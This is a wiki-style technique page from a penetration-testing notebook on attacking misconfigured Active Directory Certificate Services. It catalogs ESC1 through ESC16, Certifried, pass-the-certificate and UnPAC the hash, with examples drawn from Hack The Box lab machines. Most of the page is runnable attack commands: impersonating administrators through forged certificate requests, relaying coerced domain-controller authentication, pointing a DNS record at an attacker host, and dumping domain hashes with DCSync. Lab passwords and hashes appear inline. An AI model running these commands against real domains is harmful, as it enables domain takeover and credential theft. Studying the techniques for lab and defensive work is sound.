---
title: "Active Directory Certificate Services (ADCS) Attacks"
type: technique
tags: [active-directory, adcs, certificates, esc1, esc10, esc13, esc14, esc15, esc16, esc3, esc4, esc7, esc8, esc9, golden-certificate, kerberos, passthecert, shadow-credentials, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-09-10
sources: [0xdf-adcs, InternalAllTheThings]
---

## What it is

**Active Directory Certificate Services (ADCS)** is a Windows Server role that acts as an enterprise public key infrastructure (PKI). When misconfigured, it allows low-privileged domain users to obtain certificates that can be used to authenticate as any domain account, including Domain Admins. The ESC (Escalation via Certificate) naming scheme catalogs these misconfigurations.

## How it works

ADCS issues X.509 certificates to domain users and computers. **PKINIT** is a Kerberos extension that allows a certificate to substitute for a password during authentication: the client presents a certificate and private key, and if the KDC accepts it, returns a TGT and (via a U2U exchange) the account's NT hash. This means a certificate that authenticates as any user is equivalent to knowing that user's NT hash.

The chain in almost every ADCS attack is:
1. Obtain or forge a certificate that identifies as a high-privilege account.
2. Authenticate with that certificate via `certipy auth` to get an NT hash and TGT.
3. Use the NT hash with [[pass-the-hash]] techniques or the TGT directly.

## Attack phases

- **Post-exploitation / privilege escalation** — ADCS misconfigurations are discovered after initial foothold, using domain user credentials to enumerate templates.
- **Lateral movement** — shadow credentials add a key to an account you have `GenericWrite` over; the resulting NT hash gives you that account.

## Prerequisites

- A domain user account (most attacks require only Domain Users enrollment rights).
- Network access to a CA server (usually the DC) on ports 445 (RPC enrollment) or 80/443 (HTTP/HTTPS web enrollment for ESC8).
- For shadow credentials: `GenericWrite` or `GenericAll` over the target account, and the domain must have a writable DC with PKINIT support.

## Enumeration

```bash
# Find vulnerable templates (recommended starting point)
certipy find -vulnerable -u user@domain.htb -p 'Password' -dc-ip <DC_IP> -stdout

# Find all templates (manual review for ESC10, ESC13, ESC14)
certipy find -u user@domain.htb -p 'Password' -dc-ip <DC_IP> -stdout

# With Kerberos ticket
certipy find -vulnerable -k -no-pass -target DC01.domain.htb -dc-ip <DC_IP> -stdout

# LDAP channel binding required on some DCs (e.g., Rebound)
certipy find -vulnerable -u user@domain.htb -p 'Password' \
  -dc-ip <DC_IP> -scheme ldaps -ldap-channel-binding -stdout
```

`certipy find` output shows CA-level information (web enrollment status, ManageCa/ManageCertificates rights) and per-template `[!] Vulnerabilities` blocks listing the ESC class and reason.

BloodHound (via RustHound-CE for ADCS data) shows enrollment edges, GenericWrite/FullControl over templates, and ManageCa rights. Use RustHound-CE rather than bloodhound-python to collect ADCS-specific edges.

Sync your clock before any `certipy auth` call. PKINIT requires clocks within 5 minutes:

```bash
sudo ntpdate <DC_IP>
# or
sudo ntpdate -u <DC_HOSTNAME>
```

Alternative enumeration tooling when certipy is unavailable:

* NetExec:

```ps1
netexec ldap domain.lab -u username -p password -M adcs
```

* ldapsearch:

```ps1
ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
```

* certutil:

```ps1
certutil.exe -config - -ping
certutil -dump
```

## Enrollment constraints (dNSHostName / mail)

* DNS required (`CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` or `CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS`): only principals with their `dNSHostName` attribute set can enroll.
    * Active Directory Users cannot enroll in certificate templates requiring `dNSHostName`.
    * Computers will get their `dNSHostName` attribute set when you **domain-join** a computer, but the attribute is null if you simply create a computer object in AD.
    * Computers have validated write to their `dNSHostName` attribute meaning they can add a DNS name matching their computer name.

* Email required (`CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` or `CT_FLAG_SUBJECT_REQUIRE_EMAIL`): only principals with their `mail` attribute set can enroll unless the template is of schema version 1.
    * By default, users and computers do not have their `mail` attribute set, and they cannot modify this attribute themselves.
    * Users might have the `mail` attribute set, but it is rare for computers.

## ESC1: Enrollee supplies subject + client authentication EKU

**Condition:** A template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set (`msPKI-Certificate-Name-Flag`) and a Client Authentication EKU, and low-privilege users can enroll.

The attacker requests a certificate specifying an arbitrary UPN in the `-upn` field, effectively impersonating any user.

```bash
# 1. Enumerate
certipy find -vulnerable -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
  -target sequel.htb -stdout
# Look for: "ESC1" and "Enrollee Supplies Subject: True" in template output

# 2. Request certificate as administrator
certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
  -target sequel.htb -ca sequel-DC-CA \
  -template UserAuthentication -upn administrator@sequel.htb

# 3. Sync clock, then authenticate
sudo ntpdate sequel.htb
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

**Key variants:**

- Template requires minimum RSA 4096 key size — add `-key-size 4096` (Retro: RetroClients template; enrolls via Domain Computers not Domain Users)
- DC enforces strong certificate mapping (post-KB5014754) — add `-sid S-1-5-21-...-500` to embed the SID in the cert (Sendai, Retro)
- Domain Computers enrollment requires a machine account — use `addcomputer.py` to add a fake computer if MAQ > 0, or exploit a pre-Windows 2000 machine account (see below)

HTB machines: Escape (sequel.htb, UserAuthentication), Retro (retro.vl, RetroClients), Authority (authority.htb, CorpVPN), Sendai (sendai.vl, SendaiComputer)

## Certifried CVE-2022-26923

> An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.

* Find `ms-DS-MachineAccountQuota`

```ps1
bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota 
```

* Add a new computer in the Active Directory, by default `MachineAccountQuota = 10`

```ps1
bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 add computer cve 'CVEPassword1234*'
certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
```

* [ALTERNATIVE] If you are `SYSTEM` and the `MachineAccountQuota=0`: Use a ticket for the current machine and reset its SPN

```ps1
Rubeus.exe tgtdeleg
export KRB5CCNAME=/tmp/ws02.ccache
bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local set object 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName
```

* Set the `dNSHostName` attribute to match the Domain Controller hostname

```ps1
bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local
bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'CN=cve,CN=Computers,DC=lab,DC=local' --attr dNSHostName
```

* Request a ticket

```ps1
# certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
```

* Either use the pfx or set a RBCD on your machine account to takeover the domain

```ps1
certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

openssl pkcs12 -in dc.pfx -out dc.pem -nodes
bloodyAD -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 add rbcd 'CRASHDC$' 'CVE$'
getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
```

## ESC3: Enrollment agent (request on behalf of)

**Condition:** A template has the Certificate Request Agent EKU, and the attacker can enroll in it. A second template allows enrollment agent certificates.

```bash
# 1. Request enrollment agent certificate
certipy req -u Lion.SK -p '!QAZ2wsx' \
  -target certificate.htb -ca 'Certificate-LTD-CA' \
  -template Delegated-CRA

# 2. Use agent certificate to request on behalf of another user
certipy req -u Lion.SK -p '!QAZ2wsx' \
  -target certificate.htb -ca 'Certificate-LTD-CA' \
  -template SignedUser \
  -on-behalf-of 'CERTIFICATE\administrator' -pfx lion.sk.pfx

# 3. Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.x
```

**ESC15 (CVE-2024-49019, EKUwu):** On unpatched CAs (pre-Nov 2024), an attacker can inject arbitrary Application Policies into a Schema Version 1 template that has Enrollee Supplies Subject. Injecting `Certificate Request Agent` policy on a V1 template turns it into an enrollment agent, enabling the ESC3 chain without a dedicated Enrollment Agent template.

```bash
# Inject agent policy into a V1 template (WebServer, etc.)
certipy req -u cert_admin -p '0xdf0xdf!' \
  -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies 'Certificate Request Agent'

# Then complete ESC3 chain
certipy req -u cert_admin -p '0xdf0xdf!' \
  -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template User \
  -pfx cert_admin.pfx \
  -on-behalf-of 'tombwatcher\Administrator'

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```

HTB machines: Certificate (certificate.htb, Delegated-CRA), TombWatcher (tombwatcher.htb, ESC15 + ESC3 chain)

## ESC4: Write access over a certificate template

**Condition:** The attacker has `WriteProperty`, `WriteDacl`, or `GenericAll` over a template object in LDAP.

The attacker overwrites the template configuration to enable EnrolleeSuppliesSubject and Client Authentication EKU, turning it into an ESC1-vulnerable template, then proceeds with the ESC1 chain.

```bash
# 1. Overwrite template with default vulnerable config
certipy template -u ca_svc@sequel.htb \
  -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
  -template DunderMifflinAuthentication \
  -write-default-configuration -no-save

# 2. Now request as ESC1
certipy req -u ca_svc@sequel.htb \
  -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb -target DC01.sequel.htb

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

Note: The `-no-save` flag applies the change in memory without saving the original to disk. The change is permanent until reverted. Use `certipy template ... -write-default-configuration` without `-no-save` to save the original for restoration.

HTB machines: EscapeTwo (sequel.htb, DunderMifflinAuthentication), Sendai (sendai.vl, SendaiComputer)

## ESC7: ManageCa privilege escalation

**Condition:** The attacker has `ManageCa` rights on a CA.

The attack adds `ManageCertificates` (officer) rights to the attacker, submits a SubCA certificate request (which is denied but saves the private key locally), then force-issues the denied request and retrieves the certificate.

```bash
# 1. Add ManageCertificates (officer) right using ManageCa
certipy ca -ca manager-DC01-CA -add-officer raven \
  -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 2. Request SubCA cert — will be denied but saves private key as <id>.key
certipy req -ca manager-DC01-CA -target dc01.manager.htb \
  -template SubCA -upn administrator@manager.htb \
  -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
# Note the Request ID (e.g., 13)

# 3. Force-issue the denied request
certipy ca -ca manager-DC01-CA -issue-request 13 \
  -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 4. Retrieve the certificate
certipy req -ca manager-DC01-CA -target dc01.manager.htb \
  -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# 5. Authenticate
sudo ntpdate 10.10.11.236
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

HTB machine: Manager (manager.htb)

## ESC8: NTLM relay to ADCS HTTP enrollment

**Condition:** ADCS web enrollment (certsrv HTTP, not HTTPS) is enabled and accepts NTLM authentication.

The attacker coerces a DC machine account to authenticate to their listener, relays the authentication to the ADCS HTTP endpoint, and obtains a certificate as the DC machine account. The machine account certificate authenticates via PKINIT, yielding the machine account's NT hash, which can DCSync all domain hashes.

```bash
# 1. Start the relay listener
certipy relay -target 'http://dc.cicada.vl/' -template DomainController

# 2. Coerce DC authentication (in a separate terminal)
# First check available methods:
netexec smb DC.cicada.vl -u rosie -p Cicada123 -k -M coerce_plus
# Then trigger coercion:
netexec smb DC.cicada.vl -u rosie -p Cicada123 -k \
  -M coerce_plus -o LISTENER=<listener_hostname> METHOD=PetitPotam

# 3. Wait for dc.pfx, then authenticate
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
# Outputs machine account NT hash and saves .ccache

# 4. DCSync using machine account Kerberos ticket
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass \
  cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl
```

**When NTLM is disabled on SMB:** Use a malicious DNS record with a serialized empty CREDENTIAL_TARGET_INFORMATION (CMTI) structure. The hostname format is `<DC-shortname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. Adding this as a DNS A record pointing to the attacker host tricks the DC into relaying even over Kerberos environments.

```bash
# Add the CMTI DNS record
bloodyAD --host DC.cicada.vl -d cicada.vl -u rosie -p Cicada123 \
  add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79
```

HTB machine: VulnCicada (cicada.vl), DarkZero (darkzero.ext, CMTI variant via MSSQL proxy)

## ESC9 and ESC16: UPN manipulation / weak certificate mapping

**ESC9 condition:** A template has `CT_FLAG_NO_SECURITY_EXTENSION` set (the `NoSecurityExtension` flag), and the attacker has `GenericWrite` or `GenericAll` over a user that can enroll in that template.

**ESC16 condition:** The CA itself has disabled the security extension OID (`1.3.6.1.4.1.311.25.2`), which applies to all issued certificates. Same prerequisites otherwise.

The attack sets the enrolling user's UPN to match the target account, requests a certificate (which will embed the modified UPN), restores the UPN, then authenticates. The KDC maps the certificate to the target account by UPN.

```bash
# 1. Read current UPN (to restore later)
certipy account -u winrm_svc@fluffy.htb \
  -hashes :33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc read

# 2. Set UPN to administrator
certipy account -u winrm_svc@fluffy.htb \
  -hashes :33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc -upn administrator update

# 3. Request certificate as ca_svc (the cert will have administrator UPN)
certipy req -u ca_svc@fluffy.htb \
  -hashes :33bd09dcd697600edf6b3a7af4875767 \
  -ca fluffy-DC01-CA -template FluAuthentication \
  -dc-ip 10.10.11.x

# 4. Restore UPN BEFORE authenticating
certipy account -u winrm_svc@fluffy.htb \
  -hashes :33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc -upn ca_svc@fluffy.htb update

# 5. Now authenticate — maps to administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.x
```

Critical: restore the UPN before authenticating. If you authenticate before restoring, the cert maps to the target (administrator) correctly, but the ca_svc account now has a dangling administrator UPN that will cause authentication failures for ca_svc.

HTB machines: Certified (certified.htb, ESC9), Fluffy (fluffy.htb, ESC16)

## ESC10: Weak Schannel certificate mapping

**Condition:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods` includes bit flag `0x4` (UPN mapping). The attacker has `GenericWrite` over a user account and can enroll in at least one Client Authentication template.

Certipy does not detect this automatically. Verify the registry key from a shell:

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
# CertificateMappingMethods = 0x4 means vulnerable
```

The exploit flow is the same as ESC9: set the UPN of a controllable user to the target machine account UPN (e.g., `DC01$@domain.htb`), request a certificate, restore the UPN, then authenticate with `-ldap-shell` to get LDAP access as the machine account.

```bash
# Set UPN to machine account
certipy account -user mark.bbond update -upn 'DC01$@mirage.htb' \
  -target DC01.mirage.htb -k -dc-ip 10.10.11.78 \
  -u 'Mirage-Service$' -k -no-pass

# Request cert (will embed DC01$@mirage.htb as UPN)
certipy req -k -dc-ip 10.10.11.78 -target DC01.mirage.htb \
  -ca mirage-DC01-CA -template User \
  -u mark.bbond@mirage.htb -p '1day@atime'

# Restore UPN
certipy account -user mark.bbond update -upn 'mark.bbond@mirage.htb' \
  -target DC01.mirage.htb -k -dc-ip 10.10.11.78 \
  -u 'Mirage-Service$' -k -no-pass

# Authenticate as machine account via LDAP Schannel
certipy auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
# Use LDAP shell: set_rbcd DC01$ <owned_account>$ → S4U2Proxy → DCSync
```

HTB machine: Mirage (mirage.htb)

## ESC14: altSecurityIdentities mapping abuse

**Condition:** A user has an `altSecurityIdentities` attribute set (e.g., `X509:<RFC822>user@domain.htb`), and the attacker can modify the `mail` attribute of an enrollable user so its value matches that identity mapping.

When a template uses `SubjectAltRequireEmail`, the issued certificate includes the enrollee's email address. If that email matches the `altSecurityIdentities` of a different user, the KDC will authenticate the certificate holder as that different user.

```bash
# Modify d.baker's mail attribute to match h.brown's altSecurityIdentities
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1 \
  set object d.baker mail --value 'h.brown@scepter.htb'

# Request certificate as d.baker (will embed h.brown@scepter.htb as email SAN)
certipy req -username d.baker@scepter.htb \
  -hashes :18b5fb0d99e7a475316213c15b6f22ce \
  -target dc01.scepter.htb -ca scepter-DC01-CA \
  -template StaffAccessCertificate -dc-ip 10.10.11.65

# Authenticate specifying the mapped username
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 \
  -domain scepter.htb -username h.brown
```

HTB machine: Scepter (scepter.htb)

## Shadow credentials

**Condition:** The attacker has `GenericWrite` or `GenericAll` over a target account.

Adding a `msDS-KeyCredentialLink` value to the target object and authenticating through it with PKINIT (certipy shadow auto, bloodyAD, Whisker): [[password-shadow-credentials]].

## Golden certificate (CA key theft)

**Condition:** The attacker has local administrator or SYSTEM access on the CA server, or can access the CA private key via backup rights (e.g., `SeManageVolumePrivilege`, `SeBackupPrivilege`).

Exporting the CA certificate and private key, then forging a certificate for any user (`certipy forge`): [[active-directory-golden-certificate]].

## Pass-The-Certificate

> Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"

* Windows

```ps1
# Information about a cert file
certutil -v -dump admin.pfx

# From a Base64 PFX
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

# Grant DCSync rights to an user
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
# To restore
./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
```

* Linux

```ps1
# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
​
# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Using Certipy
certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
```

### PKINIT error handling (KDC_ERROR_CLIENT_NOT_TRUSTED)

When the DC does not support **PKINIT** (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.

```ps1
$ certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
[...]
KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)
```

There is still a way to use the certificate to takeover the account.

* Open an LDAP shell using the certificate

```ps1
certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
```

* Add a computer for RBCD

```ps1
impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name "NEWCOMPUTER" -computer-pass "P@ssw0rd123*"
```

* Set the RBCD

```ps1
set_rbcd 'TARGET$' 'NEWCOMPUTER$'
```

* Request a ticket with impersonation

```ps1
impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'
```

* Use the ticket

```ps1
export KRB5CCNAME=DC$.ccache
impacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'
```

### PassTheCert fallback (KDC_ERR_PADATA_TYPE_NOSUPP)

When `certipy auth` fails with `KDC_ERR_PADATA_TYPE_NOSUPP`, the DC does not have a certificate configured for PKINIT (smart card auth). Use PassTheCert instead to authenticate via LDAP over SChannel.

```bash
# Option 1: certipy auth with -ldap-shell
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.222 -ldap-shell
# LDAP shell allows: add_user_to_group, set_rbcd, write_rbcd, etc.

# Option 2: split .pfx and use passthecert.py
certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt

python passthecert.py -action ldap-shell \
  -crt administrator.crt -key administrator.key \
  -domain authority.htb -dc-ip 10.10.11.222
# then: add_user_to_group svc_ldap administrators
```

HTB machine: Authority (authority.htb, CorpVPN template, Domain Computers enrollment)

## UnPAC The Hash

Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

```ps1
export KRB5CCNAME=/pwd/to/user.ccache
proxychains certipy req -username "user@domain.lab" -ca "domain-DC-CA" -target "dc1.domain.lab" -template User -k -no-pass -dns-tcp -ns 10.10.10.10 -dc-ip 10.10.10.10
proxychains certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab
```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

```ps1
# Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

```ps1
# Obtain a TGT by validating a PKINIT pre-authentication
gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Use the session key to recover the NT hash
export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
```

## Common Error Messages

| Error Name | Description |
| ---------- | ----------- |
| `CERTSRV_E_TEMPLATE_DENIED` | The permissions on the certificate template do not allow the current user to enroll |
| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | Certificate cannot be used for PKINIT client authentication |
| `KDC_ERROR_CLIENT_NOT_TRUSTED` | Reserved for PKINIT. Try to authenticate to another DC |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | KDC has no support for padata type. CA might be expired |

`KDC_ERR_PADATA_TYPE_NOSUPP` still allows using the certificate via Pass-The-Cert, since the DC's LDAPS service only checks the SAN; see the PassTheCert fallback above.

## Pre-Windows 2000 machine accounts

Machine accounts created with the "Pre-Windows 2000 Compatible Access" option set have a default password equal to the lowercase hostname (e.g., a machine named `BANKING$` has password `banking`).

These accounts often have Domain Computers group membership, which grants enrollment in machine-targeted certificate templates (e.g., ESC1 on a template requiring Domain Computers enrollment).

The default password triggers `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` on normal authentication. Fix with `changepasswd.py` using the `rpc-samr` protocol, then authenticate normally:

```bash
# Change password using rpc-samr (bypasses the logon restriction)
changepasswd.py -newpass 0xdf0xdf 'retro.vl/BANKING$:banking@dc.retro.vl' \
  -protocol rpc-samr

# Alternatively, authenticate with Kerberos (-k) via netexec
netexec smb dc.retro.vl -u 'BANKING$' -p banking -k

# Then request ESC1 certificate
certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf \
  -ca retro-DC-CA -template RetroClients \
  -upn administrator@retro.vl -key-size 4096 \
  -sid S-1-5-21-...-500
```

HTB machine: Retro (retro.vl)

## Post-authentication: what to do with the NT hash

After `certipy auth` returns `Got hash for 'administrator@domain': aad3b435...:<nthash>`:

```bash
# WinRM shell
evil-winrm -i <DC_IP> -u administrator -H <nthash>

# DCSync all domain hashes
secretsdump.py -just-dc-user administrator \
  domain.htb/administrator@<DC_IP> -hashes :<nthash>
secretsdump.py -just-dc domain.htb/administrator@<DC_IP> -hashes :<nthash>

# PTH via SMB
netexec smb <DC_IP> -u administrator -H <nthash> --exec-method smbexec -x whoami

# Kerberos ticket (saved as .ccache)
KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass \
  domain.htb/administrator@dc.domain.htb
```

## Tips and gotchas

**Clock skew kills certipy auth.** PKINIT requires clocks within 5 minutes. Error: `KRB_AP_ERR_SKEW(Clock skew too great)`. Fix: `sudo ntpdate <DC_IP>`. This may drop VPN; reconnect and re-run.

**`-dc-ip` vs `-target`:** `-dc-ip` is the DC IP for Kerberos/LDAP queries. `-target` is the FQDN of the CA server for certificate enrollment. When the CA is also the DC, both point to the same host but `-target` needs the FQDN.

**CA name must match exactly.** Copy from `certipy find` output `CA Name:` field (e.g., `sequel-DC-CA`, not `DC-CA`).

**`-ns` flag.** In environments where your attacker machine's DNS does not resolve domain hostnames, add `-ns <DC_IP>` to certipy commands.

**Missing object SID.** `[*] Certificate has no object SID` means the certificate lacks SID binding. On patched DCs (KB5014754), `certipy auth` may reject it. Add `-sid <user_SID>` to the `certipy req` command.

**`-key-size 4096`.** Some templates enforce a minimum RSA key size. If `certipy req` returns a public key length error, add `-key-size 4096`.

**LDAP channel binding errors.** Add `-scheme ldaps -ldap-channel-binding` to `certipy find` if the DC requires LDAP channel binding (seen on Rebound).

**Version matters.** ESC9 requires v4.0+; ESC13 and ESC16 require v4.8+; ESC10 and ESC14 require v5.0+. Upgrade with `uv tool upgrade certipy-ad`. Newer ESCs are added with short lead times before related HTB machines release.

**Proxychains.** When behind a pivot, prefix certipy commands with `proxychains` or `proxychains -q`. Set `KRB5CCNAME` before the proxychains call.

**ESC14 requires specific template.** The template must use `SubjectAltRequireEmail` so the issued certificate embeds the mail attribute. Not all templates do this.

**ESC10 vs ESC9.** ESC9 is a template flag; ESC16 is a CA-level flag. ESC10 is a server-side registry setting (`CertificateMappingMethods = 0x4`). Certipy detects ESC9 and ESC16 automatically; ESC10 requires manual registry inspection from a shell.

## Related techniques

- [[wiki/tools/certipy]] — tool reference for all subcommands and flags
- [[uac-bypass]] — ESC1 via CVE-2022-26923 (machine template SPN manipulation) is documented there
- [[pass-the-hash]] — use NT hashes returned by certipy auth
- [[ad-lateral-movement]] — shadow credentials enable lateral movement
- [[ad-enumeration]] — BloodHound shows GenericWrite/ManageCa paths into ADCS

## Sources

- 0xdf HTB writeups: absolute, authority, certificate, certified, darkcorp, darkzero, escape, escapetwo, fluffy, haze, manager, mirage, mist, rebound, retro, scepter, sendai, tombwatcher, vulncicada

## References

* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [AD CS Domain Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#shell-access-to-adcs-ca-with-yubihsm-esc12)
* [ADCS Attack Paths in BloodHound — Part 2 - Jonas Bülow Knudsen - May 1, 2024](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [Diving Into AD CS: Exploring Some Common Error Messages - Jacques Coertze - March 7, 2025](https://sensepost.com/blog/2025/diving-into-ad-cs-exploring-some-common-error-messages/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)

